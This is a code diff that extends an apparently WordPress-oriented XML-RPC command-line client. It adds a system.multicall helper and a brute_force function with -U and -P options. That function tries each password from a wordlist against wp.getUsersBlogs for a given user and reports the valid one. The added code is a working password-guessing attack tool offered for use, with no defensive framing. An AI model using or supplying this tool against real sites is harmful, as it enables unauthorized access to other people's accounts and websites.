@@ -27,7 +27,6 @@ def banner():
 def create_proxy(server_url):
     try:
         proxy = xmlrpc.client.ServerProxy(server_url)
-        # Test connection
         proxy.system.listMethods()
         return proxy
     except Exception as e:
@@ -45,7 +44,21 @@ def getMethods(proxy):
 
 def callMethod(proxy, method, params):
     try:
-        result = getattr(proxy, method)(*params) if params else getattr(proxy, method)()
+        if method == "system.multicall":
+            if not params or len(params) % 2 != 0:
+                print(f"{RED}Error:{RESET} 'system.multicall' requires pairs of method names and parameters.")
+                return
+            
+            calls = []
+            for i in range(0, len(params), 2):
+                method_name = params[i]
+                method_params = [params[i + 1]]
+                calls.append({"methodName": method_name, "params": method_params})
+            
+            result = proxy.system.multicall(calls)
+        else:
+            result = getattr(proxy, method)(*params) if params else getattr(proxy, method)()
+        
         print(f"{BLUE}Result of '{method}':{RESET} {result}")
     except xmlrpc.client.Fault as fault:
         print(f"{RED}Error:{RESET} {fault.faultString}")
@@ -54,10 +67,29 @@ def callMethod(proxy, method, params):
     except Exception as e:
         print(f"{RED}Unexpected error:{RESET} {e}")
 
+def brute_force(proxy, username, password_list):
+    for password in password_list:
+        try:
+            print(f"{YELLOW}Trying password: {password}{RESET}")
+            result = proxy.wp.getUsersBlogs(username, password)
+            if isinstance(result, list): 
+                print(f"{GREEN}Success:{RESET} Password '{password}' is valid!")
+                return  
+            else:
+                print(f"{RED}Failed:{RESET} Password '{password}' is invalid.")
+        except xmlrpc.client.Fault as fault:
+            print(f"{RED}Error:{RESET} {fault.faultString}")
+        except Exception as e:
+            print(f"{RED}Unexpected error:{RESET} {e}")
+    print(f"{RED}No valid password found.{RESET}")
+
+
 if __name__ == "__main__":
     banner()
     parser = argparse.ArgumentParser(description="XML-RPC client")
     parser.add_argument("-u", "--url", required=True, help="URL of the XML-RPC server")
+    parser.add_argument("-U", "--user", help="Username for brute force (required for brute force)")
+    parser.add_argument("-P", "--passwords", help="File containing passwords for brute force")
     parser.add_argument("-l", "--list", action="store_true", help="List available methods")
     parser.add_argument("-m", "--method", help="Method to call")
     parser.add_argument("params", nargs="*", help="Parameters for the method (optional)")
@@ -65,10 +97,21 @@ if __name__ == "__main__":
 
     proxy = create_proxy(args.url)
 
-    if args.list:
-        getMethods(proxy)
-    elif args.method:
-        params = args.params if args.params else []
-        callMethod(proxy, args.method, params)
-    else:
-        print(f"{YELLOW}Please specify either --list/-l to list methods or --method/-m to call a method.{RESET}")
+if args.list:
+    getMethods(proxy)
+elif args.method:
+    params = args.params if args.params else []
+    callMethod(proxy, args.method, params)
+elif args.user and args.passwords:
+    try:
+        with open(args.passwords, "r", encoding="utf-8") as f:
+            password_list = [line.strip() for line in f.readlines()]
+        brute_force(proxy, args.user, password_list)
+    except FileNotFoundError:
+        print(f"{RED}Error:{RESET} Password file not found.")
+    except UnicodeDecodeError:
+        print(f"{RED}Error:{RESET} Unable to decode the password file. Ensure it is UTF-8 encoded.")
+    except Exception as e:
+        print(f"{RED}Error:{RESET} {e}")
+else:
+    print(f"{YELLOW}Please specify either --list/-l to list methods, --method/-m to call a method, or --user/-U with --passwords/-P for brute force.{RESET}")
